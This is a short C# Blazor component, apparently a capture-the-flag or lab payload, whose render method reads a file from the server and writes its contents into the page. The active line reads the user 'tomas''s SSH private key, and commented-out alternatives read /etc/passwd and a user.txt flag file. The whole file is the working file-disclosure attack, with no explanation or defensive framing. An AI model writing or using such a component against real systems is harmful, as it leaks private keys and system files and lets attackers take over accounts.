﻿using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
using System.IO;

namespace sedlyf
{
    public class Component : ComponentBase
    {
        protected override void BuildRenderTree(RenderTreeBuilder builder)
        {
            base.BuildRenderTree(builder);

            //string file = File.ReadAllText("/etc/passwd");
            //string file = File.ReadAllText("/home/tomas/user.txt");
            string file = File.ReadAllText("/home/tomas/.ssh/id_rsa");

            builder.AddContent(0, file);
        }
    }
}